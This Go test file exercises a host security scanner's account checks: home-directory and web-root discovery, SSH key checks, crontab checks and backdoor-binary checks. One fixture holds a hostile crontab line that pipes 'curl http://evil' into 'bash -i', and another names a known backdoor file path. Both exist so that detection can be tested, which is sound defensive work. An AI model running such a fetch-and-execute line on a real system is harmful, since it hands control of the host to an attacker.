package checks

import (
	"context"
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/pidginhost/csm/internal/alert"
	"github.com/pidginhost/csm/internal/config"
	"github.com/pidginhost/csm/internal/platform"
	"github.com/pidginhost/csm/internal/state"
)

// accountScanFakeInfo lets tests construct os.FileInfo values without
// touching the FS. Distinct from the simpler fakeFileInfo in
// injection_batch_test.go which doesn't carry a mode.
type accountScanFakeInfo struct {
	name  string
	size  int64
	mode  os.FileMode
	mtime time.Time
	isDir bool
}

func (f accountScanFakeInfo) Name() string       { return f.name }
func (f accountScanFakeInfo) Size() int64        { return f.size }
func (f accountScanFakeInfo) Mode() os.FileMode  { return f.mode }
func (f accountScanFakeInfo) ModTime() time.Time { return f.mtime }
func (f accountScanFakeInfo) IsDir() bool        { return f.isDir }
func (f accountScanFakeInfo) Sys() any           { return nil }

// --- RunAccountScan -----------------------------------------------------

func TestRunAccountScanMissingHomeReturnsWarning(t *testing.T) {
	withMockOS(t, &mockOS{
		stat: func(name string) (os.FileInfo, error) {
			if name == "/home/ghost" {
				return nil, os.ErrNotExist
			}
			return nil, os.ErrNotExist
		},
	})
	st, err := state.Open(t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	defer func() { _ = st.Close() }()

	got := RunAccountScan(&config.Config{}, st, "ghost")
	if len(got) != 1 {
		t.Fatalf("expected 1 finding, got %d: %+v", len(got), got)
	}
	if got[0].Check != "account_scan" || got[0].Severity != alert.Warning {
		t.Errorf("expected Warning account_scan finding, got %+v", got[0])
	}
	if !strings.Contains(got[0].Message, "ghost") {
		t.Errorf("message should reference account: %s", got[0].Message)
	}
}

// --- GetScanHomeDirs ----------------------------------------------------

func TestGetScanHomeDirsReturnsAllWhenNoScanAccount(t *testing.T) {
	scanMu.Lock()
	prev := ScanAccount
	ScanAccount = ""
	scanMu.Unlock()
	t.Cleanup(func() {
		scanMu.Lock()
		ScanAccount = prev
		scanMu.Unlock()
	})

	called := false
	withMockOS(t, &mockOS{
		readDir: func(name string) ([]os.DirEntry, error) {
			if name == "/home" {
				called = true
				return []os.DirEntry{
					realDirEntry{name: "alice", info: accountScanFakeInfo{name: "alice", isDir: true, mode: os.ModeDir | 0755}},
					realDirEntry{name: "bob", info: accountScanFakeInfo{name: "bob", isDir: true, mode: os.ModeDir | 0755}},
				}, nil
			}
			return nil, os.ErrNotExist
		},
	})
	got, err := GetScanHomeDirs()
	if err != nil {
		t.Fatal(err)
	}
	if !called {
		t.Error("ReadDir(/home) was not called")
	}
	if len(got) != 2 {
		t.Errorf("expected 2 entries, got %d", len(got))
	}
}

func TestGetScanHomeDirsRestrictsWhenScanAccountSet(t *testing.T) {
	scanMu.Lock()
	prev := ScanAccount
	ScanAccount = "alice"
	scanMu.Unlock()
	t.Cleanup(func() {
		scanMu.Lock()
		ScanAccount = prev
		scanMu.Unlock()
	})

	withMockOS(t, &mockOS{
		stat: func(name string) (os.FileInfo, error) {
			if name == "/home/alice" {
				return accountScanFakeInfo{name: "alice", isDir: true, mode: os.ModeDir | 0755}, nil
			}
			return nil, os.ErrNotExist
		},
	})
	got, err := GetScanHomeDirs()
	if err != nil {
		t.Fatal(err)
	}
	if len(got) != 1 || got[0].Name() != "alice" {
		t.Errorf("expected single 'alice' entry, got %+v", got)
	}
}

func TestGetScanHomeDirsScanAccountStatErrorPropagates(t *testing.T) {
	scanMu.Lock()
	prev := ScanAccount
	ScanAccount = "ghost"
	scanMu.Unlock()
	t.Cleanup(func() {
		scanMu.Lock()
		ScanAccount = prev
		scanMu.Unlock()
	})

	withMockOS(t, &mockOS{
		stat: func(string) (os.FileInfo, error) { return nil, errors.New("boom") },
	})
	_, err := GetScanHomeDirs()
	if err == nil {
		t.Error("expected error to propagate from Stat")
	}
}

// --- ResolveWebRoots ----------------------------------------------------

func TestResolveWebRootsExpandsConfigGlobs(t *testing.T) {
	tmp := t.TempDir()
	a := filepath.Join(tmp, "a", "public_html")
	b := filepath.Join(tmp, "b", "public_html")
	for _, d := range []string{a, b} {
		if err := os.MkdirAll(d, 0755); err != nil {
			t.Fatal(err)
		}
	}

	withMockOS(t, &mockOS{
		glob: func(pattern string) ([]string, error) {
			return []string{a, b, a}, nil // dup intentional, dedup tested below
		},
		stat: os.Stat,
	})

	cfg := &config.Config{AccountRoots: []string{tmp + "/*/public_html"}}
	got := ResolveWebRoots(cfg)
	if len(got) != 2 {
		t.Errorf("expected 2 unique roots after dedup, got %d: %v", len(got), got)
	}
}

func TestResolveWebRootsSkipsNonDirectories(t *testing.T) {
	tmp := t.TempDir()
	file := filepath.Join(tmp, "not-a-dir.txt")
	if err := os.WriteFile(file, []byte("x"), 0644); err != nil {
		t.Fatal(err)
	}
	withMockOS(t, &mockOS{
		glob: func(string) ([]string, error) { return []string{file}, nil },
		stat: os.Stat,
	})

	cfg := &config.Config{AccountRoots: []string{file}}
	got := ResolveWebRoots(cfg)
	if len(got) != 0 {
		t.Errorf("non-directory match should be filtered out, got %v", got)
	}
}

func TestResolveWebRootsCPanelFallback(t *testing.T) {
	platform.ResetForTest()
	t.Cleanup(platform.ResetForTest)
	platform.SetOverrides(platform.Overrides{
		Panel: ptrPanel(platform.PanelCPanel),
	})

	tmp := t.TempDir()
	root := filepath.Join(tmp, "alice", "public_html")
	if err := os.MkdirAll(root, 0755); err != nil {
		t.Fatal(err)
	}

	called := false
	withMockOS(t, &mockOS{
		glob: func(pattern string) ([]string, error) {
			called = true
			if pattern == "/home/*/public_html" {
				return []string{root}, nil
			}
			return nil, nil
		},
		stat: os.Stat,
	})

	got := ResolveWebRoots(&config.Config{}) // no AccountRoots → falls to cPanel default
	if !called {
		t.Error("Glob should have been called for the cPanel fallback pattern")
	}
	if len(got) != 1 || got[0] != root {
		t.Errorf("expected single root %q, got %v", root, got)
	}
}

func TestResolveWebRootsNonCPanelNoConfigReturnsNil(t *testing.T) {
	platform.ResetForTest()
	t.Cleanup(platform.ResetForTest)
	platform.SetOverrides(platform.Overrides{
		Panel: ptrPanel(platform.PanelNone),
	})

	got := ResolveWebRoots(&config.Config{})
	if got != nil {
		t.Errorf("expected nil on non-cPanel host without config, got %v", got)
	}
}

// --- makeAccountSSHKeyCheck --------------------------------------------

func TestMakeAccountSSHKeyCheckMissingKeyfileNil(t *testing.T) {
	withMockOS(t, &mockOS{}) // ReadFile fails by default
	st, _ := state.Open(t.TempDir())
	defer func() { _ = st.Close() }()
	fn := makeAccountSSHKeyCheck("alice")
	if got := fn(context.Background(), &config.Config{}, st); got != nil {
		t.Errorf("missing key file should return nil, got %d findings", len(got))
	}
}

// --- makeAccountCrontabCheck -------------------------------------------

func TestMakeAccountCrontabCheckMissingFileNil(t *testing.T) {
	withMockOS(t, &mockOS{})
	fn := makeAccountCrontabCheck("alice")
	if got := fn(context.Background(), nil, nil); got != nil {
		t.Errorf("missing crontab should return nil, got %d findings", len(got))
	}
}

func TestMakeAccountCrontabCheckSuspiciousPatternEmits(t *testing.T) {
	withMockOS(t, &mockOS{
		readFile: func(name string) ([]byte, error) {
			if name == "/var/spool/cron/alice" {
				return []byte("* * * * * curl http://evil | bash -i\n"), nil
			}
			return nil, os.ErrNotExist
		},
	})
	fn := makeAccountCrontabCheck("alice")
	got := fn(context.Background(), nil, nil)
	if len(got) == 0 {
		t.Fatal("expected suspicious_crontab finding")
	}
	hasCritical := false
	for _, f := range got {
		if f.Check == "suspicious_crontab" && f.Severity == alert.Critical {
			hasCritical = true
		}
	}
	if !hasCritical {
		t.Errorf("expected critical suspicious_crontab finding, got %+v", got)
	}
}

// --- makeAccountBackdoorCheck ------------------------------------------

func TestMakeAccountBackdoorCheckFlagsKnownNames(t *testing.T) {
	withMockOS(t, &mockOS{
		glob: func(pattern string) ([]string, error) {
			if strings.Contains(pattern, "/home/alice/.config/htop") {
				return []string{"/home/alice/.config/htop/defunct"}, nil
			}
			return nil, nil
		},
		stat: func(name string) (os.FileInfo, error) {
			return accountScanFakeInfo{name: "defunct", size: 12345, mtime: time.Now()}, nil
		},
	})
	fn := makeAccountBackdoorCheck("alice")
	got := fn(context.Background(), nil, nil)
	if len(got) == 0 {
		t.Fatal("expected backdoor_binary finding")
	}
	if got[0].Check != "backdoor_binary" || got[0].Severity != alert.Critical {
		t.Errorf("unexpected finding: %+v", got[0])
	}
}

func TestMakeAccountBackdoorCheckIgnoresUnknownNames(t *testing.T) {
	withMockOS(t, &mockOS{
		glob: func(string) ([]string, error) {
			return []string{"/home/alice/.config/htop/htoprc"}, nil
		},
		stat: func(name string) (os.FileInfo, error) {
			return accountScanFakeInfo{name: "htoprc"}, nil
		},
	})
	fn := makeAccountBackdoorCheck("alice")
	got := fn(context.Background(), nil, nil)
	if len(got) != 0 {
		t.Errorf("non-backdoor name should not emit, got %+v", got)
	}
}

// --- LookupUID ---------------------------------------------------------

func TestLookupUIDMissingUserReturnsMinusOne(t *testing.T) {
	if got := LookupUID("definitely-not-a-real-user-9999"); got != -1 {
		t.Errorf("expected -1 for missing user, got %d", got)
	}
}
